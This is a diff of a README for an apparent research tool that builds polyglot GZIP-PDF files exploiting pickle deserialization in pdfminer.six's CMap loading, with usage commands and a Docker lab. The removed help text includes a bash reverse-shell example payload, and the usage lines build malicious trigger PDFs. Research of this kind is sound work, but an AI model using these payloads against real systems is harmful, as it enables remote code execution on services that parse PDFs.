@@ -1,74 +1,94 @@
 # Pdfminer CMap Generator
 
-A research tool to build polyglot GZIP-PDF files, with exploiting pdfminer CMap loading. Sharing reproduction and security research
+A security research toolkit for analyzing pickle deserialization vulnerabilities in pdfminer.six through CMap resource loading mechanisms.
 
-## Introduce
+## Vulnerability Summary
 
 **Background**
 
-- pdfminer.six <= ALL
-- 使用 pdfminer 进行 PDF 解析应用程序
+- pdfminer.six <= ALL（Until 2025.10.27）
 
-**Functions**
+**Exploitation Requirements:**
 
-- 生成恶意文件 PDF、Ployglot - GZIP and PDF；PDF 生成支持两种触发方式：CMap 加载和 XObject 路径穿越
-- 文件验证功能
-- 便于复现的 Docker 环境
+- Malicious PDF and GZIP upload capability
+- Application process PDF with pdfminer.six
+- Attacker-controlled `.pickle.gz` file accessible at predictable path
+- Knowledge of target filesystem structure
+
+## Technical Details
+
+**Vulnerability Forms:**
+
+1. ToUnicode usecmap
+   - Works with any font type (Type0/Type1/TrueType)
+   - Uses `/ToUnicode` stream with `usecmap` instruction referencing absolute path to `.pickle.gz` file
+2. Type0 Font Encoding
+   - Requires Type0 font with `/Encoding` field containing absolute path to `.pickle.gz` file
+3. XObject Path Traversal
+   - Limited impact due to forced file extensions
+
+The vulnerability of CMapDB lies in `pdfminer/cmapdb.py:33`:
+
+```
+def _load_data(cls, name: str) -> Any:
+    name = name.replace("\0", "")
+    filename = "%s.pickle.gz" % name
+    for directory in cmap_paths:
+        path = os.path.join(directory, filename)
+        if os.path.exists(path):
+            gzfile = gzip.open(path)
+            return type(str(name), (), pickle.loads(gzfile.read()))
+```
+
+Complete call chains and technical analysis available in:
+
+- [English Research Document](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research_EN.md)
+- [Chinese Research Document](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research.md)
 
 ## Usage
-```
-Usage: python3 pcg.py [options] --help
-       python3 pcg.py build -t gzip -p "echo 111 >> uploads/1.txt"
-       python3 pcg.py build -t pdf -ep "/proc/self/cwd/uploads/l1"
 
-positional arguments:
-  {build,validate,run}
-    build               build a polyglot gzip-pdf file
-    validate            Validate file
-
-options:
-  -h, --help            show this help message and exit
-```
-
-build
+### Installation
 
 ```
-usage:  build [-h] -t {gzip,pdf} [-ptt {cmap,traversal}] [-ep ENCODING_PATH] [-p PAYLOAD] [-o OUTPUT]
-
-options:
-  -h, --help            show this help message and exit
-  -t {gzip,pdf}, --type {gzip,pdf}
-                        Select GZIP or PDF
-  -ptt {cmap,traversal}, --pdf-trigger-type {cmap,traversal}
-                        PDF trigger type: cmap (CMap loading) or traversal (XObject traversal)
-  -ep ENCODING_PATH, --encoding-path ENCODING_PATH
-                        PDF - Absolute path, but no suffix, Example: /proc/self/cwd/uploads/l1
-  -p PAYLOAD, --payload PAYLOAD
-                        GZIP - CMap Pickle.loads Payload, Example: bash -c 'bash -i >& /dev/tcp/ip/5555 0>&1'
-  -o OUTPUT, --output OUTPUT
+cd src/ && pip install -r requirements.txt
 ```
 
-validate
+### Generating Polyglot GZIP/PDF Payload
 
 ```
-l1n@servers:~/docker$ python3 github/Pdfminer_CMap_Generator/src/pcg.py validate --help
-usage:  validate [-h] [-f FILE]
-
-options:
-  -h, --help            show this help message and exit
-  -f FILE, --file FILE  Plotgloy gzip-pdf file path
+python src/pcg.py build -t gzip -p "echo 123 > 1.txt"
 ```
 
-## Research
-[研究文章](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research.md)
+### Generating Trigger PDF
 
-[复现环境](https://github.com/L1nq0/Pdfminer-CMap-Generator/tree/master/research/lab/pdf2text_debug)
+```
+python src/pcg.py build -t pdf -ptt encoding -ep "/proc/self/cwd/uploads/payload"
+python src/pcg.py build -t pdf -ptt traversal -ep "/proc/self/cwd/uploads/payload"
+```
+
+## Environment
+
+Docker testing environment is provided in `research/lab/pdf2text_debug/`
+
+```
+cd research/lab/pdf2text_debug
+docker-compose up --build
+
+# Access at http://localhost:11452
+# Debug endpoints: /_dbg/trace, /_dbg/openlog, /_dbg/head
+```
+
+The environment includes:
+
+- Flask application with PDF upload endpoint
+- Monkey-patched `pickle.loads()` for deserialization logging
 
 ## References
+
+https://github.com/un1novvn
 
 https://github.com/pdfminer/pdfminer.six
 
 https://blog.wm-team.cn/index.php/archives/86/
 
 https://www.cnblogs.com/L1nq/p/19124085
-
